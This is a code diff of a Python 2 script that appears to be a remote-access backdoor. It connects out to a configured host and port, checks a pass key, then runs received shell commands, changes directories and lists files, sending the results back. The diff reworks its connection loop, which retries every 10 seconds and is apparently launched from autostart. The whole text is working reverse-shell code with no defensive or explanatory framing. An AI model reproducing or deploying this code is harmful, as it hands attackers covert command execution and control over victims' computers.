@@ -56,60 +56,67 @@ def Exec(cmde):
 def fromAutostart():
     global active
     global passKey
+    passerror = False
     while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((HOST, PORT))
+            if not passerror:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((HOST, PORT))
+                except:
+                    s.close()
+                    active = False
+                    time.sleep(10)
             data = Receive(s)
+            print 'Received Data'
             if data == passKey:
                 active = True
                 Send(s, '<p align="center" style="color:lime; font-size: 12px; background-color:#194759;">' + os.getcwdu() + '</p>')
-                print 'Access Success'
+
+                while active:
+                    data = Receive(s)
+                    if data == '':
+                        time.sleep(0.02)
+                    if data == "quit" or data == "terminate":
+                        print 'terminated'
+                        Send(s, "quitted")
+                        active = False
+                        break
+                    elif data.startswith("cd "):
+                        try:
+                            os.chdir(data[3:])
+                            stdoutput = ""
+                        except:
+                            stdoutput = "Error opening directory.\n"
+                    elif data.startswith(("Activate")):
+                        stdoutput = ''
+                    elif data.startswith("runscript"):
+                        stdoutput = Execute(data[10:])
+                    elif data.startswith("ls"):
+                        string = {}
+                        try:
+                            for n, i in enumerate(os.listdir(u'.')):
+                                string[n] = {}
+                                string[n]['name'] = i
+                                string[n]['type'] = os.path.isfile(i)
+                            stdoutput = str(string)
+                        except WindowsError:
+                            stdoutput = 'Access is denied'
+                    else:
+                        stdoutput = Exec(data)
+                    stdoutput = '<p align="center" style="color:lime; font-size: 12px; background-color:#194759;">' + os.getcwdu() + '</p>\n\n'+stdoutput
+                    Send(s, stdoutput)
+                if data == "terminate":
+                    break
+                time.sleep(3)
             else:
                 Send(s, 'Access Denied')
-                print 'Access Denied'
-
-            while active:
-                data = Receive(s)
-                if data == '':
-                    time.sleep(0.02)
-                if data == "quit" or data == "terminate":
-                    print 'terminated'
-                    Send(s, "quitted")
-                    active = False
-                    break
-                elif data.startswith("cd "):
-                    try:
-                        os.chdir(data[3:])
-                        stdoutput = ""
-                    except:
-                        stdoutput = "Error opening directory.\n"
-                elif data.startswith(("Activate")):
-                    stdoutput = ''
-                elif data.startswith("runscript"):
-                    stdoutput = Execute(data[10:])
-                elif data.startswith("ls"):
-                    string = {}
-                    try:
-                        for n, i in enumerate(os.listdir(u'.')):
-                            string[n] = {}
-                            string[n]['name'] = i
-                            string[n]['type'] = os.path.isfile(i)
-                        stdoutput = str(string)
-                    except WindowsError:
-                        stdoutput = 'Access is denied'
-                else:
-                    stdoutput = Exec(data)
-                stdoutput = '<p align="center" style="color:lime; font-size: 12px; background-color:#194759;">' + os.getcwdu() + '</p>\n\n'+stdoutput
-                Send(s, stdoutput)
-            if data == "terminate":
-                break
-            time.sleep(3)
+                passerror = True
         except socket.error:
-            s.close()
-            active = False
-            time.sleep(10)
-            continue
+                s.close()
+                active = False
+                passerror = False
+                time.sleep(10)
 
 
 fromAutostart()
